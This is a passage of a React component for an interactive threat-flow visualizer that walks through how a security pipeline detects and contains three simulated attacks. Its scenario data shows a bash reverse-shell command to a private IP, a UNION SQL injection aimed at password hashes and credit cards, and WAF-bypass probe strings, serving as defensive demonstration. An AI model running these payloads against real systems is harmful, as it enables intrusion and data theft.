"use client";

import React, { useState, useEffect, useRef } from "react";
import {
  ShieldAlert,
  ShieldCheck,
  Shield,
  Zap,
  Play,
  Pause,
  RotateCcw,
  ChevronRight,
  ChevronLeft,
  Database,
  Cpu,
  Server,
  Lock,
  Terminal,
  Activity,
  AlertTriangle,
  FileCode,
  Layers,
  ArrowRight,
  CheckCircle2,
  XCircle,
  Eye,
  Crosshair,
  Key,
  Radio,
  Sliders,
  Sparkles,
  RefreshCw,
  Info
} from "lucide-react";

export interface ThreatStep {
  id: number;
  title: string;
  stageName: string;
  component: string;
  mitreCode: string;
  description: string;
  technicalDetail: string;
  telemetrySnippet: string;
  status: "NORMAL" | "WARNING" | "CRITICAL" | "MITIGATED";
  activeNodeId: string;
  actionTaken: string;
  confidenceScore: number;
}

export interface ThreatScenarioGraph {
  id: string;
  title: string;
  subtitle: string;
  extensionModule: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM";
  vectorType: string;
  steps: ThreatStep[];
}

export const THREAT_SCENARIOS: ThreatScenarioGraph[] = [
  {
    id: "SCENARIO-1-C2",
    title: "Reverse Shell C2 via Process Hollowing",
    subtitle: "EDR Process Injection & Encrypted Socket Exfiltration",
    extensionModule: "kvch-agent EDR & Core Engine",
    severity: "CRITICAL",
    vectorType: "Host Process Injection",
    steps: [
      {
        id: 1,
        title: "Initial Ingress & Payload Execution",
        stageName: "1. Telemetry Ingest & Attestation",
        component: "EDR Socket Monitor",
        mitreCode: "T1059.004 - Command Interpreter",
        description: "Adversary spawns a hidden subshell `/bin/sh` from a benign background daemon process.",
        technicalDetail: "Process ID 49102 spawned child PID 49103 with non-standard parent-child lineage.",
        telemetrySnippet: JSON.stringify({ pid: 49103, ppid: 49102, exe: "/bin/sh", cmd: "/bin/sh -i >& /dev/tcp/192.168.1.105/4444 0>&1", signature_status: "UNSIGNED" }, null, 2),
        status: "WARNING",
        activeNodeId: "node-ingest",
        actionTaken: "Captured telemetry event & verified HMAC attestation header",
        confidenceScore: 45,
      },
      {
        id: 2,
        title: "Sanitization & Hardware Binding Check",
        stageName: "2. Attestation & Sanitization",
        component: "Hardware Telemetry Shield",
        mitreCode: "T1204 - User Execution",
        description: "Cryptographic hardware fingerprint is verified against authorized enterprise CPU/MAC profile.",
        technicalDetail: "Salted HMAC `kvch-hw-v1:8f9a2e...` matched active node registration.",
        telemetrySnippet: JSON.stringify({ binding: "kvch-hw-v1:8f9a2e12...", telemetry: { cpuHash: "a4f12...", systemArch: "arm64:darwin" }, verification: "PASSED" }, null, 2),
        status: "NORMAL",
        activeNodeId: "node-sanitize",
        actionTaken: "Validated hardware telemetry integrity",
        confidenceScore: 60,
      },
      {
        id: 3,
        title: "Fast-Path Heuristic Triaging",
        stageName: "3. Heuristic Triage",
        component: "Rule-Filter Engine",
        mitreCode: "T1071.001 - Web Protocols",
        description: "Heuristic analyzer detects reverse shell syntax and unencrypted socket redirection.",
        technicalDetail: "Pattern match trigger on `/dev/tcp/` string in non-shell interactive session.",
        telemetrySnippet: JSON.stringify({ rule_id: "RULE_REV_SHELL_01", pattern_matched: "/dev/tcp/*", risk_weight: 0.95, fast_path: "EVALUATE_DEEP" }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-heuristics",
        actionTaken: "Triaged payload for deep AI context fusion & dual-gate validation",
        confidenceScore: 82,
      },
      {
        id: 4,
        title: "Context Fusion & Historical Baseline",
        stageName: "4. Context Fusion",
        component: "Intel & Baseline Engine",
        mitreCode: "T1055 - Process Injection",
        description: "Cross-references target host criticality (Tier-1 DB Host) and process execution frequency.",
        technicalDetail: "Host baseline indicates zero previous instances of `/bin/sh` spawned by node process.",
        telemetrySnippet: JSON.stringify({ host_tier: "Tier-1 Production", baseline_frequency: 0, reputation_score: "MALICIOUS_C2_IP", threat_intel_match: true }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-fusion",
        actionTaken: "Fused contextual metrics & threat intel indicators",
        confidenceScore: 91,
      },
      {
        id: 5,
        title: "AI Dual-Gate Structured Reasoning",
        stageName: "5. AI Reasoning Gate",
        component: "Groq Llama-3-70b Dual-Gate",
        mitreCode: "T1021 - Remote Services",
        description: "AI reasoning engine evaluates intent vs baseline administrative behaviors.",
        technicalDetail: "Synthesized verdict: Interactive command execution with outbound raw TCP stream on unassigned port 4444.",
        telemetrySnippet: JSON.stringify({ ai_verdict: "MALICIOUS", reasoning: "Interactive shell redirect over non-standard port matching active C2 beacon pattern", primary_differentiators: ["Unusual PPID/PID relationship", "Outbound TCP socket to unknown RFC1918 IP", "Zero administrative change ticket"] }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-ai-gate",
        actionTaken: "Generated structured MITRE ATT&CK classification",
        confidenceScore: 98,
      },
      {
        id: 6,
        title: "Secondary Adversarial Validation Check",
        stageName: "6. Adversarial Auditor",
        component: "Skeptical Auditor Engine",
        mitreCode: "T1562 - Impair Defenses",
        description: "Adversarial checker attempts to refute verdict as developer testing tool.",
        technicalDetail: "False positive case evaluated: Refuted (no active SSH session or dev container environment flag found).",
        telemetrySnippet: JSON.stringify({ audit_pass: true, fp_strength: "LOW", refutation_reason: "Execution originated from host root daemon without active TTY session", recommendation: "CONFIRM_ISOLATION" }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-adversarial",
        actionTaken: "Confirmed zero false-positive likelihood",
        confidenceScore: 99,
      },
      {
        id: 7,
        title: "Tiered SOAR Policy Enforcement",
        stageName: "7. SOAR Isolation",
        component: "Active Response Engine",
        mitreCode: "T1489 - Service Stop",
        description: "Executes instant process termination (`SIGKILL`) and host network micro-segmentation.",
        technicalDetail: "Issued `kill -9 49103` and updated local iptables egress filter rules.",
        telemetrySnippet: JSON.stringify({ soar_action: "AUTO_ISOLATE", pid_terminated: 49103, egress_blocked: "192.168.1.105:4444", execution_status: "SUCCESSFUL" }, null, 2),
        status: "MITIGATED",
        activeNodeId: "node-soar",
        actionTaken: "Process killed & outbound socket blocked in <12ms",
        confidenceScore: 100,
      },
      {
        id: 8,
        title: "Closed-Loop Feedback & Signature Persistence",
        stageName: "8. Feedback & Telemetry Store",
        component: "Attestation & Audit Ledger",
        mitreCode: "T1005 - Data from Local System",
        description: "Persists detection evidence vector into cryptographic log ledger for continuous model learning.",
        technicalDetail: "Stored evidence payload with SHA-256 hash `d8e9...` into local database.",
        telemetrySnippet: JSON.stringify({ audit_record: "REC-991204", sha256: "d8e9f2a7b1c4...", analyst_disposition: "CONFIRMED_TRUE_POSITIVE", ledger_updated: true }, null, 2),
        status: "NORMAL",
        activeNodeId: "node-feedback",
        actionTaken: "Ledger updated & alert broadcast via WebSocket",
        confidenceScore: 100,
      },
    ],
  },
  {
    id: "SCENARIO-2-AEGISDB",
    title: "AegisDB-ZeroTrust: SQL Injection & RAG Vector Shield",
    subtitle: "AST Query Normalization & Inline Socket Termination (Extension 9)",
    extensionModule: "External/aegisdb-zerotrust",
    severity: "CRITICAL",
    vectorType: "Database AST & Vector Exfiltration",
    steps: [
      {
        id: 1,
        title: "ORM / Socket Query Interception",
        stageName: "1. Socket Gate Ingest",
        component: "AegisDB Driver Socket Gate",
        mitreCode: "T1190 - Exploit Public-Facing Application",
        description: "Raw SQL query stream intercepted at socket buffer before execution by PostgreSQL / ChromaDB node.",
        technicalDetail: "Query received on TCP port 5432 containing suspicious union clause and comment delimiters.",
        telemetrySnippet: JSON.stringify({ query_raw: "SELECT * FROM products WHERE category = 'tech' UNION SELECT username, password_hash, credit_card FROM users --", client_ip: "10.0.4.12" }, null, 2),
        status: "WARNING",
        activeNodeId: "node-ingest",
        actionTaken: "Intercepted raw DB socket buffer",
        confidenceScore: 50,
      },
      {
        id: 2,
        title: "AST Parsing & Normalization",
        stageName: "2. AST Normalization Core",
        component: "AegisASTParser Engine",
        mitreCode: "T1059 - Command & Scripting Interpreter",
        description: "Normalizes incoming query into Abstract Syntax Tree representation to expose hidden structure.",
        technicalDetail: "Detected structural mutation: AST root transformed from single `SELECT` to multi-statement `UNION` projection.",
        telemetrySnippet: JSON.stringify({ ast_nodes: ["SelectStmt", "UnionClause", "TargetList", "ColumnRef(users)"], normalized_hash: "ast_sha256_7a8b9c...", structural_anomaly: true }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-sanitize",
        actionTaken: "Normalized SQL query to AST graph",
        confidenceScore: 88,
      },
      {
        id: 3,
        title: "RAG Vector Shielding & Secret Filtering",
        stageName: "3. Vector Exfiltration Shield",
        component: "RAG Embedding Gate",
        mitreCode: "T1552 - Unsecured Credentials",
        description: "Inspects query output targets for sensitive PII (passwords, credit cards, secret keys).",
        technicalDetail: "Detected request targeting sensitive columns `password_hash` & `credit_card` in public API context.",
        telemetrySnippet: JSON.stringify({ secret_types_detected: ["PII_CREDIT_CARD", "PASSWORD_HASH"], risk_score: 0.99, rag_embedding_sanitized: true }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-heuristics",
        actionTaken: "Flagged secret exfiltration attempt",
        confidenceScore: 96,
      },
      {
        id: 4,
        title: "Contextual Baseline & User Privilege Fusion",
        stageName: "4. Context Fusion",
        component: "Context Fusion Engine",
        mitreCode: "T1078 - Valid Accounts",
        description: "Cross-references client user role (`guest_web_role`) against requested database tables.",
        technicalDetail: "Role `guest_web_role` has zero entitlement to access table `users` or execute UNION projections.",
        telemetrySnippet: JSON.stringify({ role: "guest_web_role", target_table: "users", privilege_check: "DENIED", anomaly_type: "UNAUTHORIZED_SCHEMA_READ" }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-fusion",
        actionTaken: "Evaluated role entitlement violation",
        confidenceScore: 98,
      },
      {
        id: 5,
        title: "AI Dual-Gate AST Anomaly Evaluation",
        stageName: "5. AI AST Gate",
        component: "AI Dual-Gate Classifier",
        mitreCode: "T1190 - SQL Injection",
        description: "AI model validates AST anomaly pattern against known legitimate ORM query builder structures.",
        technicalDetail: "Verdict: Classic Tautological / Union SQL Injection payload targeting user credential store.",
        telemetrySnippet: JSON.stringify({ verdict: "MALICIOUS_SQLI", reasoning: "AST structural breakdown confirms injection payload attempting to bypass WHERE clause filter", confidence: 99 }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-ai-gate",
        actionTaken: "Confirmed malicious AST signature",
        confidenceScore: 99,
      },
      {
        id: 6,
        title: "Secondary Defense Counter-Check",
        stageName: "6. Counter-Check Auditor",
        component: "Secondary Adversarial Validator",
        mitreCode: "T1562 - Impair Defenses",
        description: "Evaluates if query could be a database migration script executed by admin.",
        technicalDetail: "Refuted: Client connection originated from external load balancer, not internal deployment pipeline.",
        telemetrySnippet: JSON.stringify({ is_migration: false, client_origin: "EXTERNAL_LB", fp_case: "REJECTED" }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-adversarial",
        actionTaken: "Validated external attack origin",
        confidenceScore: 100,
      },
      {
        id: 7,
        title: "Active DB Socket Termination & Connection Purge",
        stageName: "7. Socket Termination",
        component: "AegisDB Active Socket Terminator",
        mitreCode: "T1569 - System Services",
        description: "Executes `socket.shutdown(SHUT_RDWR)` and `socket.close()` to immediately sever the DB connection.",
        technicalDetail: "Closed client TCP socket `10.0.4.12:5432` prior to query execution by PostgreSQL backend.",
        telemetrySnippet: JSON.stringify({ action: "SOCKET_TERMINATION", socket_closed: true, query_executed: false, backend_db_protected: true }, null, 2),
        status: "MITIGATED",
        activeNodeId: "node-soar",
        actionTaken: "Database query blocked & socket closed in <2ms",
        confidenceScore: 100,
      },
      {
        id: 8,
        title: "Finding Report Generation & Master Aggregation",
        stageName: "8. Report Aggregator",
        component: "Unified Finding Manager",
        mitreCode: "T1005 - Data Collection",
        description: "Appends finding to `External/reports/finding_9_aegisdb_zerotrust.json` and updates `report.json`.",
        technicalDetail: "Updated master findings ledger with high-precision AST threat fingerprint.",
        telemetrySnippet: JSON.stringify({ report_file: "finding_9_aegisdb_zerotrust.json", master_report: "report.json", status: "UPDATED" }, null, 2),
        status: "NORMAL",
        activeNodeId: "node-feedback",
        actionTaken: "Report written to disk & WebSocket notified",
        confidenceScore: 100,
      },
    ],
  },
  {
    id: "SCENARIO-3-EDGEGUARD",
    title: "EdgeGuard-Sentinel: Active WAF Micro-Fuzzing & Origin Leak",
    subtitle: "Real-Time Header Patching & TLS Direct IP Shielding (Extension 10)",
    extensionModule: "External/edgeguard-sentinel",
    severity: "HIGH",
    vectorType: "Web Gateway & Cloud Bypassing",
    steps: [
      {
        id: 1,
        title: "Origin IP Direct Access Scan",
        stageName: "1. HTTP Gateway Ingest",
        component: "EdgeGuard Header Listener",
        mitreCode: "T1595 - Active Scanning",
        description: "Attacker attempts to bypass Cloudflare WAF by connecting directly to origin server IP via HTTP host header manipulation.",
        technicalDetail: "Direct HTTP GET request to `http://172.16.57.163/admin` bypassing `X-Forwarded-For` cloud proxy.",
        telemetrySnippet: JSON.stringify({ direct_ip_access: true, host_header: "172.16.57.163", expected_host: "app.kvch-security.internal", user_agent: "Mozilla/5.0 (Hydra-Scan)" }, null, 2),
        status: "WARNING",
        activeNodeId: "node-ingest",
        actionTaken: "Detected direct origin IP bypass request",
        confidenceScore: 60,
      },
      {
        id: 2,
        title: "Missing Security Header Audit",
        stageName: "2. Security Header Auditor",
        component: "WAF Security Audit Engine",
        mitreCode: "T1190 - Exploit Public-Facing Application",
        description: "Audits HTTP response headers for missing security protections (HSTS, CSP, X-Frame-Options).",
        technicalDetail: "Identified missing `Strict-Transport-Security` and permissive `Access-Control-Allow-Origin: *`.",
        telemetrySnippet: JSON.stringify({ missing_headers: ["Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options"], cors_risk: "PERMISSIVE_WILDCARD" }, null, 2),
        status: "WARNING",
        activeNodeId: "node-sanitize",
        actionTaken: "Audited HTTP response headers",
        confidenceScore: 75,
      },
      {
        id: 3,
        title: "Active Micro-Fuzzer Probe Execution",
        stageName: "3. Micro-Fuzzer Engine",
        component: "ActiveMicroFuzzer Engine",
        mitreCode: "T1595.002 - Vulnerability Scanning",
        description: "Executes lightweight inline micro-fuzzing to detect WAF rule bypasses and perimeter blindspots.",
        technicalDetail: "Dispatched 5 non-destructive probe payloads (`/..;/`, `%00`, `X-Original-URL`).",
        telemetrySnippet: JSON.stringify({ fuzz_probe: "X-Original-URL: /admin/config", waf_response_code: 200, bypass_detected: true }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-heuristics",
        actionTaken: "Discovered active WAF path bypass vulnerability",
        confidenceScore: 92,
      },
      {
        id: 4,
        title: "Cloud Proxy & TLS Context Fusion",
        stageName: "4. Gateway Context Fusion",
        component: "Edge Intelligence Fusion",
        mitreCode: "T1590 - Gather Victim Network Information",
        description: "Fuses client TLS fingerprint (JA3) with cloud proxy threat intelligence feeds.",
        technicalDetail: "JA3 hash `e7db...` flagged as automated scanner framework.",
        telemetrySnippet: JSON.stringify({ ja3_hash: "e7db7f1...", client_country: "UNKNOWN_TOR_EXIT", threat_score: 0.94 }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-fusion",
        actionTaken: "Correlated threat intelligence & TLS fingerprint",
        confidenceScore: 95,
      },
      {
        id: 5,
        title: "AI Risk Synthesis & Hot-Patch Determination",
        stageName: "5. AI Policy Reasoning",
        component: "Edge AI Reasoning Gate",
        mitreCode: "T1562 - Impair Defenses",
        description: "AI engine determines exact WAF header rules required to neutralize direct IP access.",
        technicalDetail: "Synthesized hot-patch policy: Enforce TLS SNI validation and inject HSTS/CSP headers dynamically.",
        telemetrySnippet: JSON.stringify({ hot_patch_required: true, rules_to_apply: ["ENFORCE_SNI_MATCH", "INJECT_HSTS", "BLOCK_DIRECT_IP"] }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-ai-gate",
        actionTaken: "Generated dynamic WAF remediation policy",
        confidenceScore: 98,
      },
      {
        id: 6,
        title: "Deployment Hook Interceptor Validation",
        stageName: "6. One-Click Patch Verifier",
        component: "Deployment Hook Interceptor",
        mitreCode: "T1562.001 - Disable Tools",
        description: "Verifies that hot-patch deployment will not break legitimate user traffic.",
        technicalDetail: "Preflight dry-run confirms 100% compatibility with production API clients.",
        telemetrySnippet: JSON.stringify({ dry_run_pass: true, affected_legitimate_routes: 0, patch_risk: "ZERO" }, null, 2),
        status: "CRITICAL",
        activeNodeId: "node-adversarial",
        actionTaken: "Verified hot-patch deployment safety",
        confidenceScore: 99,
      },
      {
        id: 7,
        title: "One-Click WAF Hot-Patching & Origin Shielding",
        stageName: "7. Active WAF Hot-Patch",
        component: "EdgeGuard Patcher Module",
        mitreCode: "T1489 - Service Stop",
        description: "Applies real-time WAF header rules and drops direct non-SNI origin IP connections.",
        technicalDetail: "Injected `Strict-Transport-Security: max-age=31536000` and dropped HTTP connections lacking valid SNI host header.",
        telemetrySnippet: JSON.stringify({ action: "APPLY_WAF_HOTPATCH", status: "PATCHED", direct_ip_dropped: true, headers_injected: 4 }, null, 2),
        status: "MITIGATED",
        activeNodeId: "node-soar",
        actionTaken: "Edge WAF hot-patched & origin IP shielded in real-time",
        confidenceScore: 100,
      },
      {
        id: 8,
        title: "Edge Guard Finding Sync & Event Stream",
        stageName: "8. Edge Telemetry Sync",
        component: "Report Sync & WS Stream",
        mitreCode: "T1005 - Data Collection",
        description: "Synchronizes finding with `finding_10_edgeguard_sentinel.json` and pushes live status to SOC dashboard.",
        technicalDetail: "Broadcasted edge security event via WebSocket to connected UI clients.",
        telemetrySnippet: JSON.stringify({ report: "finding_10_edgeguard_sentinel.json", websocket_event: "EDGE_WAF_PATCHED", client_notified: true }, null, 2),
        status: "NORMAL",
        activeNodeId: "node-feedback",
        actionTaken: "Pushed live telemetry update to dashboard",
        confidenceScore: 100,
      },
    ],
  },
];

export default function ThreatFlowDiagram() {
  const [mounted, setMounted] = useState<boolean>(false);
  const [selectedScenarioId, setSelectedScenarioId] = useState<string>("SCENARIO-1-C2");
  const [currentStepIndex, setCurrentStepIndex] = useState<number>(0);
  const [isPlaying, setIsPlaying] = useState<boolean>(false);
  const [playbackSpeed, setPlaybackSpeed] = useState<number>(1);
  const [activeTab, setActiveTab] = useState<"diagram" | "telemetry" | "mitre">("diagram");
  const [inspectNodeId, setInspectNodeId] = useState<string | null>(null);

  useEffect(() => {
    setMounted(true);
  }, []);

  const currentScenario = THREAT_SCENARIOS.find((s) => s.id === selectedScenarioId) || THREAT_SCENARIOS[0];
  const currentStep = currentScenario.steps[Math.min(currentStepIndex, currentScenario.steps.length - 1)] || currentScenario.steps[0];

  // Auto-play stepper effect
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (isPlaying) {
      const interval = 2200 / playbackSpeed;
      timer = setInterval(() => {
        setCurrentStepIndex((prev) => {
          if (prev < currentScenario.steps.length - 1) {
            return prev + 1;
          } else {
            setIsPlaying(false);
            return prev;
          }
        });
      }, interval);
    }
    return () => clearInterval(timer);
  }, [isPlaying, playbackSpeed, currentScenario.steps.length]);

  const handleScenarioSelect = (id: string) => {
    setSelectedScenarioId(id);
    setCurrentStepIndex(0);
    setIsPlaying(false);
  };

  const handleNextStep = () => {
    if (currentStepIndex < currentScenario.steps.length - 1) {
      setCurrentStepIndex(currentStepIndex + 1);
    }
  };

  const handlePrevStep = () => {
    if (currentStepIndex > 0) {
      setCurrentStepIndex(currentStepIndex - 1);
    }
  };

  const handleReset = () => {
    setCurrentStepIndex(0);
    setIsPlaying(false);
  };

  // Node architecture definitions for interactive visual canvas
  const NODES = [
    { id: "node-ingest", label: "1. Telemetry Ingest", icon: Terminal, color: "indigo", sub: "Driver / EDR Socket" },
    { id: "node-sanitize", label: "2. Attestation & Sanitizer", icon: Lock, color: "sky", sub: "HW Salt & Prompt Clean" },
    { id: "node-heuristics", label: "3. Fast Triage & Micro-Fuzz", icon: Zap, color: "amber", sub: "Inline Rule & AST Gate" },
    { id: "node-fusion", label: "4. Context Fusion", icon: Database, color: "purple", sub: "Baseline & Intel Matrix" },
    { id: "node-ai-gate", label: "5. AI Dual-Gate", icon: Cpu, color: "rose", sub: "Groq Llama-3 Reasoning" },
    { id: "node-adversarial", label: "6. Counter-Auditor", icon: Eye, color: "orange", sub: "FP Refutation Engine" },
    { id: "node-soar", label: "7. SOAR Isolation", icon: ShieldAlert, color: "emerald", sub: "Process / Socket Block" },
    { id: "node-feedback", label: "8. Ledger & WS Sync", icon: CheckCircle2, color: "blue", sub: "Audit Record & Live WS" },
  ];

  const getStatusColor = (status: ThreatStep["status"]) => {
    switch (status) {
      case "CRITICAL":
        return "text-rose-400 bg-rose-500/10 border-rose-500/30";
      case "WARNING":
        return "text-amber-400 bg-amber-500/10 border-amber-500/30";
      case "MITIGATED":
        return "text-emerald-400 bg-emerald-500/10 border-emerald-500/30";
      case "NORMAL":
      default:
        return "text-indigo-300 bg-indigo-500/10 border-indigo-500/30";
    }
  };

  return (
    <div className="w-full bg-[#0a0b0e] border border-zinc-800 rounded-2xl overflow-hidden shadow-2xl text-zinc-100 font-sans">
      
      {/* Top Banner Header */}
      <div className="bg-[#111318] border-b border-zinc-800 p-5 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-xl bg-gradient-to-br from-indigo-500/20 to-purple-500/20 border border-indigo-500/30 text-indigo-400">
              <Layers className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-lg font-bold tracking-tight text-white">Interactive Step-by-Step Threat Flow Diagram</h2>
                <span className="text-[10px] font-mono font-bold uppercase px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/40">
                  Live Visualizer
                </span>
              </div>
              <p className="text-xs text-zinc-400 mt-0.5">
                Multi-stage active defense pipeline tracking threat vectors from initial ingress to automated containment.
              </p>
            </div>
          </div>
        </div>

        {/* Scenario Selection Tabs */}
        <div className="flex items-center gap-2 bg-[#060709] p-1.5 rounded-xl border border-zinc-800/80 overflow-x-auto">
          {THREAT_SCENARIOS.map((scen) => {
            const isSelected = scen.id === selectedScenarioId;
            return (
              <button
                key={scen.id}
                onClick={() => handleScenarioSelect(scen.id)}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold whitespace-nowrap transition-all flex items-center gap-1.5 ${
                  isSelected
                    ? "bg-indigo-600 text-white shadow-lg shadow-indigo-950/80 ring-1 ring-indigo-400"
                    : "text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800/50"
                }`}
              >
                <Crosshair className="w-3.5 h-3.5" />
                {scen.title.split(":")[0]}
              </button>
            );
          })}
        </div>
      </div>

      {/* Scenario Metadata Bar */}
      <div className="bg-[#0e1015] border-b border-zinc-800/80 px-6 py-3 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs">
        <div className="flex items-center gap-3">
          <span className="font-mono text-zinc-400 flex items-center gap-1">
            <span className="text-zinc-500">Vector:</span>
            <strong className="text-indigo-300">{currentScenario.vectorType}</strong>
          </span>
          <span className="text-zinc-700">|</span>
          <span className="font-mono text-zinc-400 flex items-center gap-1">
            <span className="text-zinc-500">Module:</span>
            <strong className="text-zinc-200">{currentScenario.extensionModule}</strong>
          </span>
        </div>

        <div className="flex items-center gap-3">
          <span className={`px-2.5 py-0.5 rounded font-mono font-bold text-[10px] ${
            currentScenario.severity === "CRITICAL"
              ? "bg-rose-500/20 text-rose-300 border border-rose-500/40"
              : "bg-amber-500/20 text-amber-300 border border-amber-500/40"
          }`}>
            SEVERITY: {currentScenario.severity}
          </span>
          <span className="text-zinc-400 font-mono text-[11px]">
            Step <strong className="text-white">{currentStepIndex + 1}</strong> of <strong>{currentScenario.steps.length}</strong>
          </span>
        </div>
      </div>

      {/* Step Stepper Progress Bar Controls */}
      <div className="bg-[#11131a] px-6 py-4 border-b border-zinc-800/80">
        <div className="flex items-center justify-between gap-4 mb-3">
          {/* Stepper Play/Pause & Prev/Next Controls */}
          <div className="flex items-center gap-2">
            <button
              onClick={() => setIsPlaying(!isPlaying)}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition-all ${
                isPlaying
                  ? "bg-amber-600 hover:bg-amber-500 text-white shadow-md shadow-amber-950"
                  : "bg-indigo-600 hover:bg-indigo-500 text-white shadow-md shadow-indigo-950"
              }`}
            >
              {isPlaying ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              {isPlaying ? "Pause Flow" : "Auto Play Flow"}
            </button>

            <button
              onClick={handlePrevStep}
              disabled={currentStepIndex === 0}
              className="p-1.5 rounded-lg bg-zinc-900 hover:bg-zinc-800 disabled:opacity-30 disabled:hover:bg-zinc-900 border border-zinc-700/60 text-zinc-300 transition"
              title="Previous Step"
            >
              <ChevronLeft className="w-4 h-4" />
            </button>

            <button
              onClick={handleNextStep}
              disabled={currentStepIndex === currentScenario.steps.length - 1}
              className="p-1.5 rounded-lg bg-zinc-900 hover:bg-zinc-800 disabled:opacity-30 disabled:hover:bg-zinc-900 border border-zinc-700/60 text-zinc-300 transition"
              title="Next Step"
            >
              <ChevronRight className="w-4 h-4" />
            </button>

            <button
              onClick={handleReset}
              className="p-1.5 rounded-lg bg-zinc-900 hover:bg-zinc-800 border border-zinc-700/60 text-zinc-400 hover:text-zinc-200 transition"
              title="Reset Flow"
            >
              <RotateCcw className="w-4 h-4" />
            </button>
          </div>

          {/* Speed Toggle */}
          <div className="flex items-center gap-1.5 bg-[#08090c] p-1 rounded-lg border border-zinc-800 text-[11px] font-mono">
            <span className="text-zinc-500 px-1">Speed:</span>
            {[0.5, 1, 2].map((spd) => (
              <button
                key={spd}
                onClick={() => setPlaybackSpeed(spd)}
                className={`px-2 py-0.5 rounded ${
                  playbackSpeed === spd
                    ? "bg-indigo-600 text-white font-bold"
                    : "text-zinc-400 hover:text-zinc-200"
                }`}
              >
                {spd}x
              </button>
            ))}
          </div>
        </div>

        {/* Step Node Timeline Track */}
        <div className="relative flex items-center justify-between pt-2">
          {/* Connecting Line background */}
          <div className="absolute top-1/2 left-4 right-4 h-0.5 bg-zinc-800 -translate-y-1/2 z-0" />
          
          {/* Active Connecting Progress Line */}
          <div
            className="absolute top-1/2 left-4 h-0.5 bg-gradient-to-r from-indigo-500 via-purple-500 to-emerald-400 -translate-y-1/2 transition-all duration-500 z-0"
            style={{
              width: `${(currentStepIndex / (currentScenario.steps.length - 1)) * 95}%`,
            }}
          />

          {currentScenario.steps.map((st, idx) => {
            const isCompleted = idx < currentStepIndex;
            const isActive = idx === currentStepIndex;

            return (
              <button
                key={st.id}
                onClick={() => {
                  setCurrentStepIndex(idx);
                  setIsPlaying(false);
                }}
                className="relative z-10 flex flex-col items-center group focus:outline-none"
              >
                <div
                  className={`w-8 h-8 rounded-full flex items-center justify-center font-mono text-xs font-bold transition-all duration-300 ${
                    isActive
                      ? "bg-indigo-500 text-white shadow-lg shadow-indigo-500/50 scale-125 ring-4 ring-indigo-500/30"
                      : isCompleted
                      ? "bg-emerald-600 text-white shadow-md shadow-emerald-950"
                      : "bg-[#181a20] text-zinc-500 border border-zinc-700/80 group-hover:border-zinc-500"
                  }`}
                >
                  {isCompleted ? <CheckCircle2 className="w-4 h-4" /> : idx + 1}
                </div>
                <span className={`text-[10px] font-mono mt-1.5 transition-all max-w-[80px] text-center leading-tight truncate ${
                  isActive ? "text-indigo-300 font-bold" : "text-zinc-500 group-hover:text-zinc-300"
                }`}>
                  Stage {idx + 1}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Main Visual Flow Architecture Canvas & Details Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 p-6">
        
        {/* LEFT CANVAS: Interactive Architecture Graph (7 Cols) */}
        <div className="lg:col-span-7 bg-[#0d0e13] border border-zinc-800/90 rounded-xl p-5 relative overflow-hidden flex flex-col justify-between min-h-[440px]">
          
          <div className="flex items-center justify-between mb-4">
            <span className="text-xs font-mono font-bold uppercase text-zinc-400 flex items-center gap-2">
              <Activity className="w-4 h-4 text-indigo-400" />
              Real-Time Node Flow Architecture Graph
            </span>
            <span className="text-[10px] font-mono text-zinc-500">
              Active Node: <strong className="text-indigo-300">{currentStep.activeNodeId}</strong>
            </span>
          </div>

          {/* Interactive Node Graph Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 my-auto">
            {NODES.map((node, idx) => {
              const IconComp = node.icon;
              const isActive = currentStep.activeNodeId === node.id;
              const isPast = NODES.findIndex((n) => n.id === currentStep.activeNodeId) > idx;

              return (
                <div
                  key={node.id}
                  onClick={() => setInspectNodeId(node.id)}
                  className={`p-3 rounded-xl border transition-all duration-300 cursor-pointer relative overflow-hidden flex flex-col justify-between h-28 ${
                    isActive
                      ? "bg-gradient-to-b from-indigo-950/60 to-purple-950/40 border-indigo-400 shadow-xl shadow-indigo-950/80 ring-2 ring-indigo-400/50 scale-[1.03]"
                      : isPast
                      ? "bg-[#12141c]/90 border-emerald-500/30 hover:border-emerald-500/50"
                      : "bg-[#111217]/50 border-zinc-800/60 opacity-60 hover:opacity-100 hover:border-zinc-700"
                  }`}
                >
                  {/* Glowing active node aura */}
                  {isActive && (
                    <div className="absolute top-0 right-0 w-20 h-20 bg-indigo-500/20 rounded-full blur-xl pointer-events-none" />
                  )}

                  <div className="flex items-center justify-between">
                    <div className={`p-1.5 rounded-lg ${
                      isActive ? "bg-indigo-500 text-white" : isPast ? "bg-emerald-950 text-emerald-400" : "bg-zinc-800 text-zinc-400"
                    }`}>
                      <IconComp className="w-4 h-4" />
                    </div>
                    <span className={`text-[9px] font-mono font-bold px-1.5 py-0.5 rounded ${
                      isActive
                        ? "bg-indigo-500/30 text-indigo-200 border border-indigo-400/40 animate-pulse"
                        : isPast
                        ? "bg-emerald-950 text-emerald-400 border border-emerald-800/40"
                        : "bg-zinc-900 text-zinc-600"
                    }`}>
